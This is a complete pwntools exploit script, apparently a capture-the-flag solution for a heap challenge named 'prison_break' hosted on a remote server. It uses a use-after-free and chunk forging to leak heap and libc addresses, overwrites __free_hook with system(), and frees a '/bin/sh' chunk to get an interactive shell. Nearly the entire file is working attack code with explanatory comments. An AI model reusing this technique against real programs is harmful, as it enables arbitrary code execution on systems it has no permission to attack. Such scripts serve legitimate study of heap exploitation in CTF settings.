from pwn import *

LOCAL = False
REMOTE = True
GDB = True

if REMOTE:
	LOCAL = False
	GDB = False

# Cant have GDB and non local
if(GDB == True and LOCAL == False):
	LOCAL = True

local_bin = "./prison_break"

if REMOTE: 
	p = remote('94.237.55.109',31412)
	#context.log_level = 'debug'
if LOCAL:
	p = process(local_bin)
if GDB:
	context.log_level = 'debug'
	gdb.attach(p.pid,''' 
	breakrva 0x19a5
	c 3
	''')

def create(index, size, data):
	p.sendlineafter(b"# ",b"1")
	p.sendlineafter(b":",index)
	p.sendlineafter(b":",size)
	p.sendlineafter(b":",data)

def delete(index):
	p.sendlineafter(b"# ",b"2")
	p.sendlineafter(b":",index)

def view(index):
	p.sendlineafter(b"# ",b"3")
	p.sendlineafter(b":",index)

def copy(copy_index, paste_index):
	p.sendlineafter(b"# ",b"4")
	p.sendlineafter(b":",copy_index)
	p.sendlineafter(b":",paste_index)

create(b"0", b"24", b"A" * 24)
create(b"1", b"1", b"\x60" * 1)

delete(b"0")

create(b"2", b"1500", b"X" * 1400) # uaf chunk victim with unsorted bin
create(b"3", b"16", b"\xe0" * 16) # anti consolidation chunk

# We can control chunk on index 2 - arbitrary read is possible
copy(b"1", b"0")

# The \x60 overwrites to relative chunk on index 0
# This means we  can read the heap pointer and therefore reconstruct the next overflow chunk

view(b"2")

p.recvuntil(b"entry:\n")
heap_leak = u64(p.recv(6).ljust(8,b"\x00"))

log.info("Heap leak " + hex(heap_leak))

original_big_chunk = ((heap_leak>>8) << 8) | 0xe0

log.info("Heap chunk original " + hex(original_big_chunk))

chunk = p64(original_big_chunk) + p64(0x00000000000005f0) + p32(1) + p32(0x6969)

create(b"4", b"24", chunk) # forging custom chunk

# We turn the chunk back to its orgiinal location
copy(b"4", b"0")

# Now we delete chunk 2, it's journal points to soon to be unsorted bin chunk
delete(b"2")

# and again to remove the allocation bit
copy(b"4", b"0")

view(b"2")

p.recvuntil(b"entry:\n")
libc_leak = u64(p.recv(6).ljust(8,b"\x00"))

log.info("Libc leak " + hex(libc_leak))

libc = libc_leak - 0x3ebca0
free_hook = libc + 0x3ed8e8
system_address = libc + 0x4f550

log.success("LIBC at: " + hex(libc))
log.success("free hook: " + hex(free_hook))
log.success("System(): " + hex(system_address))

chunk = p64(free_hook) + p64(0x00000000000008) + p32(1) + p32(0x6969)

create(b"5", b"24", chunk) # forging free hook overwrite
copy(b"5", b"0")

# Creating system address chunk
create(b"6", b"8", p64(system_address))

log.info("Overwriting free hook with system")
copy(b"6", b"2")

create(b"7", b"16", b"/bin/sh\x00")
delete(b"7")

p.interactive()

